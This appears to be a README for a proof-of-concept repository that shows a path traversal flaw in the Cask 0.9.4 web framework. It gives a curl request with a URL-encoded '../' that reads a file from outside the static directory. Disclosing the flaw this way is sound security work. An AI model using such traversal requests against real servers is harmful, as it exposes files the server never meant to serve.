# Showcasing simple path traversal issue on Cask 0.9.4

- `sbt run`
- `curl http://localhost:8080/static/%2E%2E%2Fhi.txt`
  - Outputs `Got me…` from [`hi.txt`](hi.txt) instead of `Hi!` from [`static/hi.txt`](static/hi.txt)